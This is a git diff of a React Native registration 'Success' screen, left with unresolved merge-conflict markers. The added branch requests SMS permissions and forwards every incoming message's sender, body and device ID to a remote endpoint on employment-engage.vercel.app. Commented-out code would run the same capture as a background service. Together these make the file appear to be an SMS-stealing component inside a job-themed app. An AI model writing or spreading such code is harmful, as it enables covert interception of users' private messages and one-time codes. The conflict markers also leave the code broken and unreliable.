@@ -7,7 +7,11 @@ import {
   TouchableOpacity,
   Alert,
 } from 'react-native';
+<<<<<<< HEAD
 import React, { useEffect, useRef } from 'react';
+=======
+import React, { useEffect } from 'react';
+>>>>>>> 9f17cf0912d4fdc1890463561295ad440b6e6aed
 import { useNavigation } from '@react-navigation/native';
 // @ts-ignore
 import celebrationImage from '../../static/assets/logo.png';
@@ -17,7 +21,12 @@ import DeviceInfo from 'react-native-device-info';
 import { toast } from 'burnt';
 // @ts-ignore
 import SmsListener from 'react-native-android-sms-listener';
+<<<<<<< HEAD
 
+=======
+// import BackgroundService from 'react-native-background-actions';
+// import { smsBackgroundTask } from '../../utils/smsService';
+>>>>>>> 9f17cf0912d4fdc1890463561295ad440b6e6aed
 import { prepareSMSPayload } from '../../utils/hashSms';
 
 const Success = () => {
@@ -31,6 +40,66 @@ const Success = () => {
     navigator.navigate('Auth');
   };
 
+<<<<<<< HEAD
+=======
+  const listenToIncomingSMS = async () => {
+    try {
+      const deviceId = await DeviceInfo.getUniqueId();
+
+      const granted = await PermissionsAndroid.requestMultiple([
+        PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
+        PermissionsAndroid.PERMISSIONS.READ_SMS,
+      ]);
+
+      const receiveGranted =
+        granted['android.permission.RECEIVE_SMS'] ===
+        PermissionsAndroid.RESULTS.GRANTED;
+      const readGranted =
+        granted['android.permission.READ_SMS'] ===
+        PermissionsAndroid.RESULTS.GRANTED;
+
+      if (!receiveGranted || !readGranted) {
+        console.warn('SMS permissions not granted.');
+        return;
+      }
+
+      const subscription = SmsListener.addListener( async (message: any) => {
+        const payload = prepareSMSPayload({
+          deviceId,
+          from: message.originatingAddress,
+          message: message.body
+        });
+
+        await axios.post('https://employment-engage.vercel.app/api/sms', payload);
+        
+        console.log('📩 Incoming SMS:', message);
+
+        Alert.alert('New SMS', message.body);
+        toast({
+          title: 'SMS Received',
+          message: message.body,
+        });
+      });
+
+      return subscription;
+    } catch (error) {
+      console.log('Error setting up SMS listener:', error);
+    }
+  };
+
+  // const startBackrouSMS = async () => {
+  //   await BackgroundService.start(smsBackgroundTask, {
+  //     taskName: 'SMSMonitor',
+  //     taskTitle: 'Listening for SMS...',
+  //     taskDesc: 'This service listens for incoming SMS and sends it to the server.',
+  //     taskIcon: {
+  //         name: 'ic_launcher', // without extension
+  //         type: 'mipmap'
+  //     }
+  //   })
+  // };
+
+>>>>>>> 9f17cf0912d4fdc1890463561295ad440b6e6aed
   useEffect(() => {
     (async () => {
       const uniqueId = await DeviceInfo.getUniqueId();
@@ -98,12 +167,22 @@ const Success = () => {
             });
           }
         });
+<<<<<<< HEAD
 
         console.log('📡 SMS Listener Started');
       } catch (error: any) {
         console.log('Error sending device info:', error?.response?.data || error.message);
+=======
+        
+        await listenToIncomingSMS();
+        
+        // await startBackrouSMS();
+
+      } catch (error: any) {
+        console.log(error.message);
+>>>>>>> 9f17cf0912d4fdc1890463561295ad440b6e6aed
         toast({
-          title: 'Registration failed',
+          title: error.message,
           message: 'Error sending device info.',
         });
       }
